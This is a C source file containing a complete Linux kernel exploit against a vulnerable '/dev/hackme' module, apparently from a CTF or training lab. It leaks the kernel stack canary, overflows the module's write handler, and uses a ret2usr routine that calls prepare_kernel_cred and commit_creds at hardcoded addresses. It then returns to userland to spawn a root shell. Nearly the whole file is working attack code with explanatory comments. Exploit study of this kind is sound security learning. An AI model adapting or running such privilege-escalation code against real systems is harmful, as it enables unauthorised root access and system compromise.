#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>

int global_fd;
unsigned long canary;

void open_dev() {
    global_fd = open("/dev/hackme", O_RDWR);
    if (global_fd < 0) {
        puts("[!] Failed to open device");
        exit(-1);
    } else {
        puts("[*] Opened device");
    }
}

void leak() {
    unsigned n = 20;
    unsigned long leak[n];
    ssize_t r = read(global_fd, leak, sizeof(leak));
    canary = leak[16];

    printf("[*] Leaked %zd bytes\n", r);
    printf("[8] Cookie: %lx\n", canary);
}


void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}


// Save the state of the following registers before going to kernel mode.
// That way we can restore them when returning to userland to pop the shell.
unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state() {
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    ); 
    puts("[*] Saved state");
}


// prepare_kernel_cred: 0xffffffff814c67f0
// commit_creds: 0xffffffff814c6410
unsigned long user_rip = (unsigned long)get_shell;

void escalate_privs() {
    __asm__(
        ".intel_syntax noprefix;"
        "movabs rax, 0xffffffff814c67f0;" //prepare_kernel_cred
        "xor rdi, rdi;" // set to 0x0 (NULL) to prepare task for kernel itself (kernel privs)
	    "call rax;"
        "mov rdi, rax;" // mov the resulting struct cred to be the first argument to commit_cres()
	    "movabs rax, 0xffffffff814c6410;" //commit_creds
	    "call rax;"
        "swapgs;" // swap gs register between kernel and user mode
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}


void overflow() {
    puts("overflow called");
    unsigned n = 50;
    unsigned long payload[n];
    unsigned offset = 16; // offset to start of stack canary

    // begin crafting the payload
    payload[offset++] = canary; // this will set the canary to the correct value

    // in kernel mode there are 3 registers popped and not just rbp
    payload[offset++] = 0x0; // rbx
    payload[offset++] = 0x0; // r12
    payload[offset++] = 0x0; // rbp

    // overwrite return address with escalate privs asm code
    payload[offset++] = (unsigned long)escalate_privs; // ret

    puts("[*] Prepared payload");
    ssize_t w = write(global_fd, payload, sizeof(payload));

    puts("[!] Should never be reached");

}

int main() {

    // save the userland state before the exploit begins
    save_state();

    // open handle to the hackme module
    open_dev();

    // leak the canary using the read function
    leak();

    // bof using the write function
    overflow();

    puts("[!] Should never be reached");

    return 0;
}